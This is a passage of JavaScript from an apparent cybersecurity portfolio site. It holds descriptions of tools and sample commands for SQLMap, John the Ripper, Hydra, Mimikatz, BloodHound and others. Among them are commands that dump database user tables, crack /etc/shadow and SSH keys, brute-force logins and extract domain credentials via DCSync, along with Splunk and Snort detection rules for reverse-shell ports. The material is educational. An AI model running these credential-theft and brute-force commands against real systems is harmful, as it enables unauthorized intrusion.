        { icon: '👥', title: 'Collaboration', desc: '<strong>Collaborative analysis</strong> — Ghidra Server allows multiple analysts to work on the same binary simultaneously, sharing comments, labels, and bookmarks across a team.' },
      ],
      usage: {
        label: 'Ghidra — malware analysis workflow',
        code: `<span class="cmd">file malware.exe</span>        <span class="hi">→ PE32+ executable, UPX packed</span>
<span class="cmd">upx -d malware.exe</span>      <span class="hi">→ unpacked: malware_unpacked.exe</span>
<span class="out"># Import into Ghidra → auto-analyse → Functions window</span>
<span class="out">→ Search Strings: "http", "cmd", ".exe", registry paths</span>
<span class="hi">→ Found: http://185.220.x.x/gate.php (C2 URL)</span>
<span class="warn">→ XOR loop at 0x00401A20 — key: 0x4E (decodes config blob)</span>`
      },
      skills: [['Static Analysis', '78%'], ['Decompilation', '75%'], ['String Extraction', '85%'], ['Anti-Debug ID', '72%']],
      tags: ['Reverse Engineering', 'Malware Analysis', 'Decompiler', 'PE Analysis', 'NSA', 'IDA Pro']
    },
    maltego: {
      icon: '🕵️', name: 'Maltego', cat: 'OSINT · Link Analysis · Graph Intel',
      summary: 'Maltego is a powerful visual intelligence platform that maps relationships between people, organisations, domains, IPs, phone numbers, and social accounts using automated data transforms. It turns raw OSINT data into an interactive graph showing hidden connections. I use Maltego in the reconnaissance phase of penetration tests to map an organisation\'s full digital footprint.',
      features: [
        { icon: '🔄', title: 'Automated Transforms', desc: '<strong>Automated transforms</strong> — one-click operations that query 60+ data providers (Shodan, VirusTotal, PassiveTotal, social networks) and automatically draw connections between entities on the graph.' },
        { icon: '🗺️', title: 'Graph Visualisation', desc: '<strong>Visual link analysis</strong> — displays entities (domains, IPs, emails, persons, companies) as graph nodes with edges showing relationships; patterns emerge that are invisible in raw text data.' },
        { icon: '🌐', title: 'Domain Mapping', desc: '<strong>Domain & infrastructure mapping</strong> — starting from a single domain, Maltego enumerates subdomains, resolves IPs, identifies hosting providers, finds related domains by registrant, and maps the full infrastructure.' },
        { icon: '👤', title: 'Person Profiling', desc: '<strong>Person entity enrichment</strong> — from an email address, Maltego can find linked social profiles, phone numbers, physical addresses, and affiliated organisations using breach data and social transforms.' },
        { icon: '🦠', title: 'Threat Intelligence', desc: '<strong>Threat actor attribution</strong> — correlates malware C2 IPs, phishing domains, and email addresses to identify infrastructure reuse patterns and link campaigns to known threat actors.' },
        { icon: '📊', title: 'Report Export', desc: '<strong>Report generation</strong> — exports the graph as PDF, PNG, XLSX, or raw entity CSV for inclusion in penetration test reports and threat intelligence deliverables.' },
      ],
      usage: {
        label: 'Maltego — domain recon workflow',
        code: `<span class="out">New Graph → Add entity: Domain → "target.com"</span>
<span class="out">Run transforms: DNS → MX, NS, Subdomains</span>
<span class="hi">→ mail.target.com  → 203.0.113.15  (Outlook 365)</span>
<span class="hi">→ vpn.target.com   → 198.51.100.7  (Cisco ASA 9.12)</span>
<span class="hi">→ dev.target.com   → 198.51.100.22 (exposed GitLab)</span>
<span class="warn"># Run BuiltWith transform → dev.target.com uses WordPress 5.8 (unpatched)</span>`
      },
      skills: [['Graph Analysis', '85%'], ['Transform Usage', '82%'], ['Domain Mapping', '88%'], ['Threat Intel', '78%']],
      tags: ['OSINT', 'Link Analysis', 'Graph Intel', 'Domain Recon', 'Threat Actor', 'Transforms']
    },
    python: {
      icon: '🐍', name: 'Python', cat: 'Scripting · Automation · Tool Development',
      summary: 'Python is my primary scripting and tool development language for security work. Its rich ecosystem of security-focused libraries makes it indispensable for automating repetitive tasks, building custom forensics tools, writing exploit scripts, parsing binary data, and developing automation pipelines that chain multiple security tools together.',
      features: [
        { icon: '🔬', title: 'Forensics Scripting', desc: '<strong>Forensics automation</strong> — file carving with python-magic, EXIF extraction with Pillow/exifread, SQLite parsing for browser forensics, EVTX log parsing with python-evtx, and timeline generation.' },
        { icon: '🌐', title: 'Network & Exploitation', desc: '<strong>Network & exploitation</strong> — scapy for raw packet crafting and network analysis; impacket for SMB, Kerberos, and LDAP protocol interaction in Active Directory attacks (GetUserSPNs, secretsdump).' },
        { icon: '🔄', title: 'Automation & APIs', desc: '<strong>API integration</strong> — requests library for VirusTotal, Shodan, and threat intel API lookups; paramiko for SSH automation; Beautiful Soup for scraping and OSINT data extraction.' },
        { icon: '🧪', title: 'CTF & Crypto', desc: '<strong>CTF problem solving</strong> — pwntools for binary exploitation (ROP chains, format strings); pycryptodome for cryptographic attacks (XOR cracking, RSA e=3 cube root, padding oracle).' },
        { icon: '📊', title: 'Data Processing', desc: '<strong>Data analysis & reporting</strong> — pandas for processing large forensics datasets; json/csv parsing for log analysis; Jinja2 for automated HTML report generation from forensics findings.' },
        { icon: '⚙️', title: 'Tool Development', desc: '<strong>Custom tool development</strong> — all 6 GitHub repos are Python or Bash; building reusable forensics utilities, Volatility plugin wrappers, and SIEM alert parsers from scratch.' },
      ],
      usage: {
        label: 'python3 — forensics snippet',
        code: `<span class="cmt"># Automated Volatility triage + IOC report</span>
<span class="cmd">import subprocess, json</span>
<span class="cmd">plugins = ["windows.pstree","windows.malfind","windows.netstat","windows.hashdump"]</span>
<span class="cmd">for p in plugins:</span>
<span class="cmd">    out = subprocess.run(["python3","vol.py","-f","dump.raw",p], capture_output=True)</span>
<span class="hi">→ Generates structured JSON IOC report from all plugin outputs</span>`
      },
      skills: [['Scripting', '90%'], ['Forensics Tools', '88%'], ['impacket/scapy', '82%'], ['CTF/pwntools', '80%']],
      tags: ['Python', 'Scripting', 'Impacket', 'Scapy', 'pwntools', 'Automation', 'Forensics']
    },
    splunk: {
      icon: '📊', name: 'Splunk', cat: 'SIEM · Log Analysis · Threat Hunting',
      summary: 'Splunk is the leading Security Information and Event Management (SIEM) platform used in enterprise SOC environments. It ingests, indexes, and correlates billions of log events from endpoints, firewalls, web servers, and cloud infrastructure. I use Splunk for threat hunting, alert triage, and detection engineering — building SPL queries that surface real attacks from noisy log data.',
      features: [
        { icon: '🔍', title: 'SPL Query Language', desc: '<strong>Search Processing Language (SPL)</strong> — Splunk\'s powerful query syntax enables filtering, aggregation, statistical analysis, and visualisation of log data; stats, eval, rex, and transaction are the core commands.' },
        { icon: '🚨', title: 'Alert Engineering', desc: '<strong>Detection rule building</strong> — scheduled searches that alert when threshold conditions are met (e.g. 5+ failed logons from one IP in 60 seconds); maps directly to MITRE ATT&CK technique IDs.' },
        { icon: '📈', title: 'Dashboards', desc: '<strong>SOC dashboards</strong> — real-time panels showing failed logons, PowerShell execution events, new scheduled tasks, unusual outbound connections, and service installations across the fleet.' },
        { icon: '🕵️', title: 'Threat Hunting', desc: '<strong>Proactive threat hunting</strong> — hunting for living-off-the-land binaries (lolbas), process injection patterns (Event ID 8), credential access (Event ID 4648), and lateral movement (Event ID 4624 type 3).' },
        { icon: '🔗', title: 'Log Correlation', desc: '<strong>Multi-source correlation</strong> — joins Windows event logs, Sysmon, firewall logs, and endpoint data to build complete attack chains across time and multiple hosts.' },
        { icon: '🤖', title: 'SOAR Integration', desc: '<strong>Automation & SOAR</strong> — Splunk SOAR (Phantom) playbooks automate tier-1 triage: enriching IPs via VirusTotal, isolating hosts via EDR API, and creating JIRA tickets on confirmed incidents.' },
      ],
      usage: {
        label: 'Splunk SPL — threat hunting',
        code: `<span class="cmd">index=windows EventCode=4625 | stats count by src_ip | sort -count | head 10</span>
<span class="hi">→ Brute-force: 192.168.1.55 → 847 failed logons in 10 minutes</span>
<span class="cmd">index=windows EventCode=4688 NewProcessName="*powershell*" CommandLine="*-enc*"</span>
<span class="hi">→ Encoded PowerShell execution — suspected dropper</span>
<span class="cmd">index=network dest_port=4444 OR dest_port=1337 | stats count by src_ip dest_ip</span>
<span class="warn">→ C2 callback detected: host-007 → 185.220.101.47:4444</span>`
      },
      skills: [['SPL Queries', '78%'], ['Dashboard Building', '75%'], ['Alert Tuning', '72%'], ['Threat Hunting', '76%']],
      tags: ['SIEM', 'SOC', 'SPL', 'Log Analysis', 'Threat Hunting', 'Alert Triage', 'Blue Team']
    },
    gobuster: {
      icon: '🔎', name: 'Gobuster', cat: 'Directory Busting · DNS Brute-Force',
      summary: 'Gobuster is a fast, concurrent directory, file, DNS, and S3 bucket brute-forcing tool written in Go. Unlike slower Python-based alternatives, Gobuster uses goroutines to send hundreds of requests simultaneously, making it ideal for quickly enumerating web application attack surfaces. I use Gobuster in every web-based CTF and pentest to find hidden admin panels, backup files, and API endpoints.',
      features: [
        { icon: '📁', title: 'Directory & File Busting', desc: '<strong>Dir mode</strong> — brute-forces URL paths against a wordlist to discover hidden directories (/admin, /backup, /api), configuration files (.env, web.config), and upload endpoints not linked from the main site.' },
        { icon: '🌐', title: 'DNS Subdomain Enum', desc: '<strong>DNS mode</strong> — brute-forces subdomains by querying DNS for each wordlist entry; discovers dev., staging., vpn., and internal. subdomains that are reachable but not publicly advertised.' },
        { icon: '🪣', title: 'S3 Bucket Discovery', desc: '<strong>S3 mode</strong> — enumerates Amazon S3 bucket names based on target organisation patterns; finds publicly accessible buckets containing sensitive files, backups, or source code.' },
        { icon: '⚡', title: 'Go Concurrency', desc: '<strong>Concurrent performance</strong> — --threads controls goroutine count; 50 threads on a standard connection processes 300+ requests per second, completing a 220k-word list in under 15 minutes.' },
        { icon: '🎯', title: 'Extension Fuzzing', desc: '<strong>Extension brute-forcing</strong> — -x php,html,txt,bak,zip appends extensions to every wordlist entry, finding backup files (index.php.bak), source code (login.php~), and database dumps (db.sql).' },
        { icon: '🔇', title: 'Status Filtering', desc: '<strong>Response filtering</strong> — --exclude-length and -b flags remove false positives by filtering specific status codes or response lengths; essential for applications that return 200 for non-existent pages.' },
      ],
      usage: {
        label: 'kali@forensics — gobuster enum',
        code: `<span class="cmd">gobuster dir -u http://10.10.x.x -w /usr/share/dirb/wordlists/common.txt -x php,html,txt,bak -t 50</span>
<span class="hi">/admin          (Status: 200) [Size: 4821]</span>
<span class="hi">/login.php      (Status: 200) [Size: 1203]</span>
<span class="hi">/backup.zip     (Status: 200) [Size: 2048192]</span>
<span class="warn">/config.php.bak (Status: 200) [Size: 412]   ← credentials in backup!</span>
<span class="cmd">gobuster dns -d target.com -w subdomains-top1mil.txt</span>
<span class="hi">→ dev.target.com, vpn.target.com, staging.target.com</span>`
      },
      skills: [['Dir Busting', '100%'], ['DNS Enum', '95%'], ['Extension Fuzzing', '95%'], ['Result Analysis', '100%']],
      tags: ['Directory Busting', 'Web Recon', 'DNS Enum', 'Go', 'S3', 'CTF', 'Pentesting']
    },
    sqlmap: {
      icon: '&#128172;', name: 'SQLMap', cat: 'Web App Security · SQLi Automation',
      summary: 'SQLMap is the industry-standard open-source tool for detecting and exploiting SQL injection vulnerabilities. It automates the entire process — from identifying injectable parameters to extracting database contents, dumping tables, and even achieving OS command execution on the underlying server in some configurations.',
      features: [
        { icon: '&#128269;', desc: '<strong>Injection Detection</strong> — tests GET/POST parameters, headers, and cookies against boolean-based, time-based, error-based, and UNION-based SQLi techniques automatically.' },
        { icon: '&#128193;', desc: '<strong>Database Fingerprinting</strong> — identifies the exact DBMS (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and version without manual probing.' },
        { icon: '&#128229;', desc: '<strong>Data Extraction</strong> — dumps databases, tables, columns, and full row contents once an injection point is confirmed.' },
        { icon: '&#128273;', desc: '<strong>Privilege & OS Access</strong> — supports --os-shell and --os-pwn for full OS command execution where DB privileges allow (e.g. MySQL FILE priv, MSSQL xp_cmdshell).' },
        { icon: '&#128737;&#65039;', desc: '<strong>WAF/IPS Evasion</strong> — built-in tamper scripts to bypass common web application firewalls during testing.' },
      ],
      usage: {
        label: 'sqlmap — full automated dump',
        code: `<span class="cmd">sqlmap -u "http://target/page.php?id=1" --batch --dbs</span>
<span class="hi">[+] available databases: information_schema, app_db, users_db</span>
<span class="cmd">sqlmap -u "http://target/page.php?id=1" -D users_db --tables</span>
<span class="hi">[+] Table: users, sessions, admin_logs</span>
<span class="cmd">sqlmap -u "http://target/page.php?id=1" -D users_db -T users --dump</span>
<span class="warn">[+] Dumped 1,204 rows — username, password_hash, email</span>`
      },
      skills: [['Detection', '88%'], ['Exploitation', '85%'], ['Tamper Scripts', '78%'], ['Reporting', '82%']],
      tags: ['SQL Injection', 'Web Security', 'Automation', 'Database', 'OWASP', 'Pentesting']
    },
    johnripper: {
      icon: '&#129485;', name: 'John the Ripper', cat: 'Password Cracking · CPU-Based',
      summary: 'John the Ripper is the original, battle-tested password cracking tool, optimised for CPU-based cracking. While Hashcat dominates GPU cracking, John remains essential for cracking Unix/Linux shadow file hashes, ZIP/RAR archive passwords, and SSH private key passphrases that Hashcat handles less elegantly.',
      features: [
        { icon: '&#128273;', desc: '<strong>Auto Hash Detection</strong> — automatically identifies hash type from format (MD5crypt, bcrypt, sha512crypt, NTLM) without manual mode flags.' },
        { icon: '&#128193;', desc: '<strong>Unshadow Utility</strong> — combines /etc/passwd and /etc/shadow into a crackable single file format for Linux credential auditing.' },
        { icon: '&#128196;', desc: '<strong>Archive Cracking</strong> — zip2john, rar2john, ssh2john convert ZIP, RAR, and SSH key passphrases into John-crackable hash formats.' },
        { icon: '&#9889;', desc: '<strong>Wordlist + Rules Engine</strong> — mutates wordlists with built-in rule sets (case toggling, leet-speak, append digits) similar to Hashcat\'s rule engine.' },
        { icon: '&#128202;', desc: '<strong>Incremental Mode</strong> — pure brute-force using character frequency tables for efficient guessing without a wordlist.' },
      ],
      usage: {
        label: 'john — cracking a Linux shadow file',
        code: `<span class="cmd">unshadow /etc/passwd /etc/shadow > combined.txt</span>
<span class="cmd">john --wordlist=rockyou.txt combined.txt</span>
<span class="hi">Loaded 4 password hashes (sha512crypt)</span>
<span class="hi">summer2023      (user: dave)</span>
<span class="cmd">ssh2john id_rsa > id_rsa.hash</span>
<span class="cmd">john --wordlist=rockyou.txt id_rsa.hash</span>
<span class="hi">dragon99        (id_rsa)</span>`
      },
      skills: [['Hash Cracking', '85%'], ['Archive/Key Cracking', '80%'], ['Rule-Based Attacks', '82%'], ['Linux Auditing', '85%']],
      tags: ['Password Cracking', 'CPU', 'Linux', 'SSH Keys', 'Archives', 'CTF']
    },
    nikto: {
      icon: '&#128270;', name: 'Nikto', cat: 'Web App Security · Vulnerability Scanner',
      summary: 'Nikto is a fast, open-source web server scanner that checks for thousands of known vulnerabilities, dangerous files, outdated software versions, and misconfigurations in a single automated pass. It is typically the first web-facing scan run after Nmap during a penetration test.',
      features: [
        { icon: '&#9888;&#65039;', desc: '<strong>6,700+ Vulnerability Checks</strong> — tests against a massive database of known dangerous files, outdated server software, and CGI vulnerabilities.' },
        { icon: '&#128190;', desc: '<strong>Outdated Software Detection</strong> — flags server software (Apache, nginx, IIS) and installed components running versions with known CVEs.' },
        { icon: '&#128274;', desc: '<strong>SSL/TLS Checks</strong> — identifies weak ciphers, expired certificates, and protocol downgrade vulnerabilities on HTTPS endpoints.' },
        { icon: '&#128193;', desc: '<strong>Dangerous File Discovery</strong> — finds exposed backup files, default install pages, and admin interfaces left accessible.' },
        { icon: '&#128203;', desc: '<strong>Multiple Report Formats</strong> — outputs to HTML, CSV, or XML for easy inclusion in penetration test reports.' },
      ],
      usage: {
        label: 'nikto — full web server scan',
        code: `<span class="cmd">nikto -h http://10.10.x.x -o report.html -Format htm</span>
<span class="hi">+ Server: Apache/2.4.18 (Ubuntu)</span>
<span class="warn">+ Apache 2.4.18 appears outdated (CVE-2017-7679, CVE-2017-9788)</span>
<span class="warn">+ /admin/: Admin login page exposed</span>
<span class="warn">+ /backup.zip: Backup file found — potential source code leak</span>
<span class="hi">+ 1247 requests: 4 vulnerabilities found</span>`
      },
      skills: [['Server Scanning', '90%'], ['CVE Matching', '85%'], ['Report Generation', '88%'], ['SSL Auditing', '78%']],
      tags: ['Web Security', 'Vulnerability Scanner', 'CVE', 'Server Auditing', 'Pentesting']
    },
    mimikatz: {
      icon: '&#128081;', name: 'Mimikatz', cat: 'Post-Exploitation · Credential Extraction',
      summary: 'Mimikatz is the definitive Windows post-exploitation tool for extracting plaintext passwords, password hashes, PIN codes, and Kerberos tickets directly from memory. It exploits how Windows historically stored credentials in LSASS process memory, making it a cornerstone of Active Directory attack chains.',
      features: [
        { icon: '&#128273;', desc: '<strong>LSASS Credential Dumping</strong> — sekurlsa::logonpasswords extracts plaintext passwords and NTLM hashes from logged-on user sessions in memory.' },
        { icon: '&#127915;', desc: '<strong>Pass-the-Hash / Pass-the-Ticket</strong> — reuses extracted NTLM hashes or Kerberos tickets to authenticate as a user without knowing their plaintext password.' },
        { icon: '&#128081;', desc: '<strong>Golden &amp; Silver Tickets</strong> — forges Kerberos TGTs (Golden Ticket) using the krbtgt hash for domain-wide persistent access.' },
        { icon: '&#128274;', desc: '<strong>DCSync Attack</strong> — impersonates a Domain Controller to request password hashes for any AD account, including krbtgt, without code execution on the DC itself.' },
        { icon: '&#128190;', desc: '<strong>Vault &amp; DPAPI Decryption</strong> — recovers credentials stored in Windows Credential Manager and browser-saved passwords protected by DPAPI.' },
      ],
      usage: {
        label: 'mimikatz — credential extraction',
        code: `<span class="cmd">privilege::debug</span>
<span class="hi">Privilege '20' OK</span>
<span class="cmd">sekurlsa::logonpasswords</span>
<span class="hi">Username: Administrator</span>
<span class="hi">NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</span>
<span class="cmd">lsadump::dcsync /domain:corp.local /user:krbtgt</span>
<span class="warn">[+] krbtgt hash extracted — Golden Ticket possible</span>`
      },
      skills: [['Credential Dumping', '82%'], ['Pass-the-Hash', '80%'], ['Golden Ticket', '72%'], ['DCSync', '75%']],
      tags: ['Active Directory', 'Post-Exploitation', 'Kerberos', 'LSASS', 'Windows', 'Red Team']
    },
    bloodhound: {
      icon: '&#128021;', name: 'BloodHound', cat: 'Active Directory · Attack Path Mapping',
      summary: 'BloodHound uses graph theory to reveal hidden and often unintended relationships within an Active Directory environment. By ingesting data collected from SharpHound, it visually maps the shortest attack path from an initial low-privilege foothold all the way to Domain Admin.',
      features: [
        { icon: '&#128202;', desc: '<strong>Graph-Based Attack Paths</strong> — visualises every user, group, computer, and trust relationship as nodes, instantly surfacing the shortest path to Domain Admin.' },
        { icon: '&#128270;', desc: '<strong>SharpHound Collector</strong> — the companion data-collection tool that ingests AD objects, sessions, ACLs, and group memberships via LDAP and SMB.' },
        { icon: '&#9881;&#65039;', desc: '<strong>Pre-Built Cypher Queries</strong> — built-in queries instantly find Kerberoastable accounts, unconstrained delegation, and AS-REP roastable users.' },
        { icon: '&#128274;', desc: '<strong>ACL Abuse Detection</strong> — identifies dangerous permission misconfigurations like GenericAll or WriteDACL that allow privilege escalation.' },
        { icon: '&#127919;', desc: '<strong>Shortest Path Analysis</strong> — given any starting node, calculates the mathematically shortest compromise chain to high-value targets.' },
      ],
      usage: {
        label: 'BloodHound — finding the path to Domain Admin',
        code: `<span class="cmd">SharpHound.exe -c All --zipfilename loot.zip</span>
<span class="hi">[+] Collected 412 users, 89 computers, 156 groups</span>
<span class="out"># Drag loot.zip into BloodHound GUI → Analysis tab</span>
<span class="cmd">Query: Shortest Paths to Domain Admins</span>
<span class="warn">[!] Path found: jsmith → GenericAll on svc-backup → svc-backup → Domain Admin</span>
<span class="hi">[+] 1 compromised account away from full domain takeover</span>`
      },
      skills: [['Graph Analysis', '80%'], ['SharpHound Collection', '78%'], ['ACL Abuse', '74%'], ['Cypher Queries', '70%']],
      tags: ['Active Directory', 'Attack Paths', 'SharpHound', 'Privilege Escalation', 'Red Team']
    },
    zap: {
      icon: '&#9889;', name: 'OWASP ZAP', cat: 'Web App Security · Free Scanner',
      summary: 'OWASP ZAP (Zed Attack Proxy) is the most widely used free, open-source web application security scanner, maintained by OWASP itself. It combines an intercepting proxy, automated active/passive scanners, and a fuzzer in one tool — functioning as a fully free alternative to Burp Suite Professional for many use cases.',
      features: [
        { icon: '&#128270;', desc: '<strong>Automated Scanner</strong> — passive scan analyses every request/response as you browse; active scan launches real attack payloads against discovered endpoints.' },
        { icon: '&#128279;', desc: '<strong>Intercepting Proxy</strong> — sits between browser and server exactly like Burp, allowing manual request modification and replay.' },
        { icon: '&#128025;', desc: '<strong>Spider &amp; AJAX Spider</strong> — crawls traditional links and JavaScript-heavy single-page apps to map the full application surface before scanning.' },
        { icon: '&#9881;&#65039;', desc: '<strong>Scripting &amp; Automation</strong> — full REST API and Zest scripting language for integrating ZAP scans into CI/CD pipelines.' },
        { icon: '&#128190;', desc: '<strong>Free &amp; Open Source</strong> — entirely free with no paywalled features, making it the standard choice for budget-conscious or educational pentesting.' },
      ],
      usage: {
        label: 'OWASP ZAP — automated scan',
        code: `<span class="out">Quick Start tab → Automated Scan → enter target URL</span>
<span class="cmd">zap-cli quick-scan --self-contained http://10.10.x.x</span>
<span class="hi">[INFO] Spidering target... 84 URLs found</span>
<span class="warn">[ALERT-HIGH] SQL Injection — /login.php (param: username)</span>
<span class="warn">[ALERT-MED] Missing Anti-CSRF Tokens — /profile/update</span>
<span class="hi">[+] Scan complete — report.html generated</span>`
      },
      skills: [['Automated Scanning', '85%'], ['Manual Proxy Testing', '82%'], ['Spidering', '88%'], ['CI/CD Integration', '70%']],
      tags: ['OWASP', 'Web Security', 'Free Tool', 'Proxy', 'Automation', 'CI/CD']
    },
    hydra: {
      icon: '&#128009;', name: 'Hydra', cat: 'Password Cracking · Online Brute Force',
      summary: 'THC-Hydra is a fast, parallelised network login cracker supporting dozens of protocols. While Hashcat and John crack hashes offline, Hydra attacks live services directly — SSH, FTP, RDP, HTTP forms, SMB, and more — making it essential for testing weak credential policies on running services.',
      features: [
        { icon: '&#127760;', desc: '<strong>50+ Protocol Support</strong> — SSH, FTP, Telnet, HTTP(S)-FORM, SMB, RDP, MySQL, PostgreSQL, VNC and dozens more in one unified tool.' },
        { icon: '&#9889;', desc: '<strong>Parallelised Attacks</strong> — runs multiple login attempts concurrently (-t flag controls thread count) for significantly faster brute-force campaigns.' },
        { icon: '&#128203;', desc: '<strong>Combo &amp; Wordlist Modes</strong> — supports username:password combo lists or separate username/password wordlist pairing.' },
        { icon: '&#128274;', desc: '<strong>HTTP Form Brute-Forcing</strong> — parses login form fields and cookies to brute-force web application login pages directly.' },
        { icon: '&#128737;&#65039;', desc: '<strong>Failure String Detection</strong> — configurable failure/success string matching to accurately detect successful logins on custom web forms.' },
      ],
      usage: {
        label: 'hydra — SSH and web form brute-force',
        code: `<span class="cmd">hydra -l admin -P rockyou.txt ssh://10.10.x.x -t 4</span>
<span class="hi">[22][ssh] login: admin   password: summer2023</span>
<span class="cmd">hydra -l admin -P rockyou.txt 10.10.x.x http-post-form \\
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"</span>
<span class="hi">[80][http-post-form] login: admin   password: P@ssw0rd!</span>`
      },
      skills: [['Service Brute-Force', '85%'], ['HTTP Form Attacks', '78%'], ['Protocol Coverage', '88%'], ['Rate Tuning', '75%']],
      tags: ['Brute Force', 'Network Services', 'SSH', 'Web Forms', 'CTF', 'Pentesting']
    },
    reconng: {
      icon: '&#127919;', name: 'Recon-ng', cat: 'OSINT · Reconnaissance Framework',
      summary: 'Recon-ng is a full-featured reconnaissance framework written in Python, built with a Metasploit-like module structure. It automates OSINT gathering — domain enumeration, contact harvesting, geolocation, and breach data lookups — by chaining together dozens of independent modules that feed results into a shared workspace database.',
      features: [
        { icon: '&#128193;', desc: '<strong>Modular Workspace</strong> — each engagement gets its own workspace database; results from one module (e.g. subdomains) automatically feed into the next (e.g. port scanning).' },
        { icon: '&#128231;', desc: '<strong>Contact &amp; Email Harvesting</strong> — modules pull employee names and email addresses from search engines, LinkedIn, and breach databases.' },
        { icon: '&#127758;', desc: '<strong>Domain &amp; Subdomain Enum</strong> — integrates with Shodan, Censys, and certificate transparency logs for passive subdomain discovery.' },
        { icon: '&#128205;', desc: '<strong>Geolocation Modules</strong> — extracts geolocation metadata from social media posts and image EXIF data tied to a target.' },
        { icon: '&#128203;', desc: '<strong>Reporting Engine</strong> — exports findings directly to HTML, CSV, or JSON reports formatted for client delivery.' },
      ],
      usage: {
        label: 'recon-ng — domain OSINT workflow',
        code: `<span class="cmd">recon-ng</span>
<span class="cmd">workspaces create target_corp</span>
<span class="cmd">modules load recon/domains-hosts/hackertarget</span>
<span class="cmd">options set SOURCE target.com</span>
<span class="cmd">run</span>
<span class="hi">[*] 14 hosts found — vpn.target.com, mail.target.com, dev.target.com</span>
<span class="cmd">modules load recon/domains-contacts/whois_pocs</span>
<span class="hi">[*] 3 contacts harvested from WHOIS records</span>`
      },
      skills: [['Module Chaining', '80%'], ['Email Harvesting', '78%'], ['Domain Enum', '85%'], ['Reporting', '82%']],
      tags: ['OSINT', 'Reconnaissance', 'Python', 'Modular Framework', 'Reporting']
    },
    snort: {
      icon: '&#128737;&#65039;', name: 'Snort', cat: 'Network Defense · IDS/IPS',
      summary: 'Snort is the world\'s most widely deployed open-source Intrusion Detection and Prevention System. It analyses live network traffic in real time against a continuously updated ruleset, detecting port scans, buffer overflow attempts, malware C2 traffic, and known exploit signatures — essential knowledge for understanding what defenders see during a penetration test.',
      features: [
        { icon: '&#128269;', desc: '<strong>Signature-Based Detection</strong> — matches traffic against thousands of community and registered rules covering known exploits, malware, and protocol anomalies.' },
        { icon: '&#9888;&#65039;', desc: '<strong>Real-Time Alerting</strong> — generates immediate alerts on rule matches, logged to file, database, or SIEM integration via syslog.' },
        { icon: '&#128683;', desc: '<strong>Inline IPS Mode</strong> — can actively drop or reject malicious packets in real time, not just passively detect them, when deployed inline.' },
        { icon: '&#128203;', desc: '<strong>Custom Rule Writing</strong> — security teams write custom Snort rules to detect organisation-specific threats or newly disclosed CVEs.' },
        { icon: '&#128202;', desc: '<strong>Protocol Anomaly Detection</strong> — flags malformed packets and protocol violations that often indicate evasion attempts or fuzzing.' },
      ],
      usage: {
        label: 'snort — live traffic monitoring',
        code: `<span class="cmd">snort -i eth0 -c /etc/snort/snort.conf -A console</span>
<span class="warn">[**] [1:1000001:1] Possible Nmap SYN scan detected [**]</span>
<span class="warn">[**] [1:2001219:1] ET SCAN Potential SSH Scan [**]</span>
<span class="cmt"># Custom rule example:</span>
<span class="cmd">alert tcp any any -> $HOME_NET 4444 (msg:"Possible reverse shell"; sid:1000010;)</span>
<span class="hi">[+] Rule loaded — monitoring for port 4444 connections</span>`
      },
      skills: [['Rule Writing', '72%'], ['Traffic Analysis', '80%'], ['IDS Deployment', '75%'], ['Alert Tuning', '70%']],
      tags: ['IDS/IPS', 'Network Defense', 'Blue Team', 'Signature Detection', 'SIEM']
    },
    yara: {
      icon: '&#129514;', name: 'YARA', cat: 'Malware Analysis · Pattern Matching',
      summary: 'YARA is the industry-standard pattern-matching tool used to identify and classify malware samples based on textual or binary patterns. Often described as "the pattern matching swiss knife for malware researchers," it lets analysts write rules describing malware families, which can then scan files, processes, or entire disk images for matches.',
      features: [
        { icon: '&#128221;', desc: '<strong>Rule-Based Detection</strong> — write rules combining string patterns, hex byte sequences, and regex to fingerprint specific malware families or behaviours.' },
        { icon: '&#128270;', desc: '<strong>Bulk File Scanning</strong> — scans entire directories or disk images against a ruleset to triage large numbers of suspicious files quickly.' },
        { icon: '&#129504;', desc: '<strong>Process Memory Scanning</strong> — scans live process memory for in-memory malware indicators that never touch disk.' },
        { icon: '&#128279;', desc: '<strong>Condition Logic</strong> — rules support boolean logic (AND/OR/NOT) combining multiple string and metadata conditions for precise detection.' },
        { icon: '&#129309;', desc: '<strong>Threat Intel Integration</strong> — widely used in VirusTotal, threat intel platforms, and EDR tools as the underlying detection engine for custom signatures.' },
      ],
      usage: {
        label: 'yara — scanning for malware patterns',
        code: `<span class="cmt"># rule file: ransomware_strings.yar</span>
<span class="cmd">rule Suspicious_Ransomware_Note {
    strings:
        $a = "your files have been encrypted" nocase
        $b = "send bitcoin to" nocase
    condition:
        $a or $b
}</span>
<span class="cmd">yara ransomware_strings.yar suspicious.exe</span>
<span class="hi">Suspicious_Ransomware_Note suspicious.exe</span>`
      },
      skills: [['Rule Writing', '78%'], ['Bulk Scanning', '82%'], ['Pattern Design', '75%'], ['Threat Intel', '72%']],
      tags: ['Malware Analysis', 'Pattern Matching', 'Threat Intel', 'DFIR', 'Detection Engineering']
    }

  };

  const tOverlay = document.getElementById('tOverlay');
  const tModal   = document.getElementById('tModal');
  const tBody    = document.getElementById('tModalBody');

  function openTool(card) {
    const id = card.dataset.tool;
    const d  = toolData[id];
    if (!d) return;

    document.getElementById('tModalIcon').textContent = d.icon;
    document.getElementById('tModalName').textContent = d.name;
    document.getElementById('tModalCat').textContent  = d.cat;

    const skillRows = d.skills.map(([label, pct]) =>
      `<div class="tmodal-skill-row">
        <span class="tmodal-skill-label">${label}</span>
        <div class="tmodal-skill-track"><div class="tmodal-skill-fill" style="width:${pct}"></div></div>
        <span class="tmodal-skill-val">${pct}</span>
      </div>`
    ).join('');

    const featureCards = d.features.map(f =>
      `<div class="tmodal-feature">
        <span class="tmodal-feature-icon">${f.icon}</span>
        <span class="tmodal-feature-text">${f.desc}</span>
      </div>`
    ).join('');

    const tagList = d.tags.map(t => `<span class="tag">${t}</span>`).join('');

    tBody.innerHTML = `
      <p class="tmodal-summary">${d.summary}</p>

      <span class="tmodal-section-title">▸ Key Capabilities</span>
      <div class="tmodal-features">${featureCards}</div>

      <span class="tmodal-section-title">▸ How I Use It — Real Commands</span>
      <div class="tmodal-usage">
        <div class="tmodal-usage-header">
          <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
          <span>${d.usage.label}</span>
        </div>
        <pre>${d.usage.code}</pre>
      </div>

      <span class="tmodal-section-title">▸ Proficiency Breakdown</span>
      <div style="margin-bottom:1.8rem">${skillRows}</div>

      <span class="tmodal-section-title">▸ Tags</span>
      <div class="tmodal-tags">${tagList}</div>
    `;

    tOverlay.classList.add('open');
